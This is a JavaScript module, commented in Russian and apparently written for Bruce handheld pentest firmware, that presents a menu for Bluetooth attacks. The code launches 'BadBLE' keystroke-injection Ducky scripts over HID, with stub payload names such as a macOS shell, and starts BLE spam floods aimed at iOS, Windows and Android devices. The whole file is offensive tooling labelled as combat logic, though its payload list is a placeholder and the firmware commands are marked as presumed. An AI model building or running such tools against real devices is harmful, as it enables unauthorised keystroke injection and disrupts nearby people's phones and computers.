// net-ble-attack.js (ZetaOS Tactical Module 3/5)
// ФУНКЦИОНАЛ: BadBLE (Ducky Scripts) & BLE Spam (iOS, Win, Android)
// Запускается с SD-карты на прошивке BRUCE/BRUTUS

// --- БАЗОВЫЕ УТИЛИТЫ (core-utils.js встроен) ---
var LINE_HEIGHT = 16;
var ZetaUI = {
    log_to_display: function(message, line, color) {
        if (line === 0) fillScreen(0);
        var displayColor = color || 0xFFFF; // White
        drawString(message, 3, line * LINE_HEIGHT, displayColor);
    },
    dialog_choice: function(options) { return dialogChoice(options); },
    show_error: function(message) { dialogError(message); fillScreen(0); ZetaUI.log_to_display("--- ERROR ---", 0, 0xF800); delay(2000); fillScreen(0); }
};
var PAYLOAD_DIR_BLE = "/sdcard/payloads/ble/";
// ----------------------------------------------------


// --- БОЕВАЯ ЛОГИКА: BLE АТАКИ ---

/**
 * Имитирует получение списка файлов пейлоадов Ducky Scripts (.txt).
 */
function get_payload_list_ble() {
    // В реальном BRUCE здесь должна быть функция fileList(PAYLOAD_DIR_BLE)
    // Возвращаем фиктивный список для демонстрации логики:
    return [
        "win_ble_recon.txt",
        "macos_ble_shell.txt",
        "android_lock.txt"
    ];
}

/**
 * Запуск Bad BLE: Выбор Ducky Script и выполнение.
 */
function run_bad_ble_ducky() {
    var payload_files = get_payload_list_ble();
    
    if (payload_files.length === 0) {
        ZetaUI.show_error("No Ducky Scripts found in " + PAYLOAD_DIR_BLE);
        return;
    }

    // Создаем меню выбора цели
    var payload_options = {};
    for (var i = 0; i < payload_files.length; i++) {
        payload_options[payload_files[i]] = payload_files[i];
    }
    payload_options["<-- Back"] = "back";
    
    var selected_payload = ZetaUI.dialog_choice(payload_options);
    
    if (selected_payload === "back" || !selected_payload) return;

    ZetaUI.log_to_display("BADBLE ACTIVE (HID)", 0, 0x001F); // Blue
    ZetaUI.log_to_display("Payload: " + selected_payload, 1);

    // КОМАНДА ЯДРА BRUCE: Предполагаемая команда для BadBLE (аналог badusb run)
    var full_path = PAYLOAD_DIR_BLE + selected_payload;
    serialCmd("badble run " + full_path); 

    ZetaUI.log_to_display("Injecting... Press any key to stop.", 3);
    
    while (!getAnyPress()) {
        delay(500);
    }
    
    serialCmd("badble stop");
    ZetaUI.log_to_display("INJECTION COMPLETE.", 5, 0x07E0); 
    delay(2000);
}

/**
 * Запуск массового BLE Spam (iOS, Windows, Android).
 */
function run_ble_spam(spam_type) {
    var cmd;
    var name_map = {
        "ios": "iOS Spam",
        "win": "Windows Spam",
        "android": "Android Spam",
        "all": "Spam All"
    };

    ZetaUI.log_to_display(name_map[spam_type] + " ACTIVE", 0, 0xFFE0); // Yellow
    
    // КОМАНДА ЯДРА BRUCE: Команды ядра BRUCE для Spam
    if (spam_type === "all") {
        cmd = "ble_spam all";
    } else {
        cmd = "ble_spam " + spam_type; 
    }
    
    serialCmd(cmd); 
    
    ZetaUI.log_to_display("Spamming... Press any key to stop.", 3);

    while (!getAnyPress()) {
        delay(500);
    }
    
    serialCmd("ble_spam stop");
    ZetaUI.log_to_display("SPAM STOPPED.", 5, 0x07E0);
    delay(2000);
}


// --- ГЛАВНОЕ МЕНЮ BLE ---
while (true) {
    fillScreen(0);
    var choice = ZetaUI.dialog_choice({
        ["1. Run BadBLE (Ducky Scripts)"]: "bad_ble",
        ["2. Spam: iOS Devices"]: "ios_spam",
        ["3. Spam: Windows Devices"]: "win_spam",
        ["4. Spam: All Devices"]: "all_spam",
        ["<-- Back / Exit"]: "exit"
    });

    if (choice === "exit" || choice === "") break;
    else if (choice === "bad_ble") {
        run_bad_ble_ducky();
    }
    else if (choice === "ios_spam") {
        run_ble_spam("ios");
    }
    else if (choice === "win_spam") {
        run_ble_spam("win");
    }
    else if (choice === "all_spam") {
        run_ble_spam("all");
    }
    fillScreen(0);
}